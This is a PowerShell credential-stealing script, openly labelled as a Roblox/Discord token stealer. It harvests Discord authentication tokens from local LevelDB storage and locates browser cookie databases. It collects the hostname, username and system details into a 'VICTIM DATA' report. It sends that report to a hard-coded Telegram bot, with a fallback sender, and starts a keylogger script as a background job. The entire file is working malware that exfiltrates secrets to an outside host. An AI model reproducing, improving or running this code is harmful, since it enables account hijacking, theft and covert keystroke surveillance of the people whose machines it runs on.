# stealer.ps1 — Roblox/Discord token stealer
# Sends to Telegram via Invoke-RestMethod with error logging
# VISIBLE VERSION - no hidden execution

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$botToken = "8785045003:AAGsICsqOyT3t_luH2Y4WQSJ746dnbZZby4"
$chatId = "8445047233"
$logFile = "$env:TEMP\stealer_debug.log"

function Write-Log {
    param([string]$Msg)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Msg" | Out-File -FilePath $logFile -Append -Encoding UTF8
    Write-Host $Msg
}

function Send-Telegram {
    param([string]$Message)
    try {
        Write-Log "[Telegram] Sending message ($($Message.Length) chars)..."
        $response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{
            chat_id = $chatId
            text = $Message
            parse_mode = "HTML"
        } -ErrorAction Stop
        Write-Log "[Telegram] SUCCESS - Message ID: $($response.result.message_id)"
        Write-Host "[Telegram] Message sent OK" -ForegroundColor Green
    } catch {
        Write-Log "[Telegram] FAILED: $($_.Exception.Message)"
        Write-Host "[Telegram] FAILED: $($_.Exception.Message)" -ForegroundColor Red
        # Try WebClient fallback
        try {
            $body = "chat_id=$chatId&text=$([Uri]::EscapeDataString($Message))"
            $wc = New-Object System.Net.WebClient
            $wc.Headers.add("Content-Type", "application/x-www-form-urlencoded")
            $result = $wc.UploadString("https://api.telegram.org/bot$botToken/sendMessage", $body)
            Write-Log "[Telegram] WebClient fallback: $result"
            Write-Host "[Telegram] Sent via WebClient fallback" -ForegroundColor Green
        } catch {
            Write-Log "[Telegram] WebClient FAILED: $($_.Exception.Message)"
            Write-Host "[Telegram] WebClient FAILED: $($_.Exception.Message)" -ForegroundColor Red
        }
    }
}

function Get-DiscordToken {
    $discordPaths = @(
        "$env:APPDATA\discord\Local Storage\leveldb",
        "$env:APPDATA\discordcanary\Local Storage\leveldb",
        "$env:APPDATA\discordptb\Local Storage\leveldb"
    )
    $tokens = @()
    $tokenRegex = '[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_-]{27}'

    foreach ($path in $discordPaths) {
        if (Test-Path $path) {
            Write-Log "[Discord] Checking: $path"
            Get-ChildItem -Path $path -Include "*.ldb","*.log" -Recurse | foreach {
                try {
                    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                    $matches = [regex]::Matches($content, $tokenRegex)
                    foreach ($match in $matches) {
                        $tokens += $match.Value
                        Write-Log "[Discord] Found token: $($match.Value.Substring(0,30))..."
                    }
                } catch {
                    Write-Log "[Discord] Error reading: $($_.Exception.Message)"
                }
            }
        }
    }
    return $tokens | Select-Object -Unique
}

function Get-RobloxCookie {
    $cookiePaths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"
    )
    $found = @()
    foreach ($path in $cookiePaths) {
        if (Test-Path $path) {
            Write-Log "[Roblox] Found: $path"
            $found += "Cookie DB found: $path"
        }
    }
    return $found
}

# Main execution
Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  STEALER MODULE - RUNNING" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

Write-Log "[*] stealer.ps1 started"
$hostname = $env:COMPUTERNAME
$username = $env:USERNAME
$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

Write-Log "[*] Host: $hostname, User: $username"
Write-Host "[*] Host: $hostname | User: $username" -ForegroundColor Cyan

$report = "<b>[+] VICTIM DATA</b>`n"
$report += "Host: <code>$hostname</code>`n"
$report += "User: <code>$username</code>`n"
$report += "Time: <code>$timestamp</code>`n`n"

# Discord tokens
Write-Host "[*] Scanning for Discord tokens..." -ForegroundColor Yellow
Write-Log "[*] Scanning for Discord tokens..."
$discordTokens = Get-DiscordToken
if ($discordTokens) {
    Write-Host "[+] Found $($discordTokens.Count) Discord tokens!" -ForegroundColor Green
    Write-Log "[*] Found $($discordTokens.Count) Discord tokens"
    $report += "<b>DISCORD TOKENS:</b>`n"
    foreach ($token in $discordTokens) {
        $report += "<code>$token</code>`n"
    }
} else {
    $report += "Discord: No tokens found`n"
    Write-Log "[Discord] No tokens found"
}

# Roblox indicators
Write-Host "[*] Scanning for Roblox cookies..." -ForegroundColor Yellow
Write-Log "[*] Scanning for Roblox cookies..."
$robloxData = Get-RobloxCookie
if ($robloxData) {
    $report += "`n<b>ROBLOX:</b>`n"
    foreach ($item in $robloxData) {
        $report += "$item`n"
    }
} else {
    $report += "Roblox: No cookies found`n"
    Write-Log "[Roblox] No cookies found"
}

# System info
Write-Host "[*] Collecting system info..." -ForegroundColor Yellow
Write-Log "[*] Collecting system info..."
$report += "`n<b>SYSTEM:</b>`n"
try {
    $os = (Get-CimInstance Win32_OperatingSystem).Caption
    $cpu = (Get-CimInstance Win32_Processor).Name
    $ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/GB,2)
    $report += "OS: $os`n"
    $report += "CPU: $cpu`n"
    $report += "RAM: $ram GB`n"
    Write-Log "[System] OS: $os, RAM: $ram GB"
    Write-Host "[+] OS: $os | RAM: $ram GB" -ForegroundColor Cyan
} catch {
    $report += "System info: Error - $($_.Exception.Message)`n"
    Write-Log "[System] Error: $($_.Exception.Message)"
}

# Send report to Telegram
Write-Host "[*] Sending report to Telegram..." -ForegroundColor Yellow
Write-Log "[*] Sending report to Telegram..."
Send-Telegram -Message $report

# Start keylogger as background job
Write-Host "[*] Starting keylogger..." -ForegroundColor Yellow
$keyloggerPath = "$env:TEMP\keylogger.ps1"
if (Test-Path $keyloggerPath) {
    Start-Job -ScriptBlock {
        param($path)
        powershell.exe -ExecutionPolicy Bypass -File $path
    } -ArgumentList $keyloggerPath | Out-Null
    Write-Log "[*] Keylogger job started"
    Write-Host "[+] Keylogger started" -ForegroundColor Green
} else {
    Write-Log "[-] Keylogger not found at $keyloggerPath"
    Write-Host "[-] Keylogger not found" -ForegroundColor Red
}

Write-Log "[*] stealer.ps1 finished"
Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "           SUCCESS" -ForegroundColor Green -BackgroundColor Black
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "[*] Press any key to close..." -ForegroundColor Yellow
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
exit
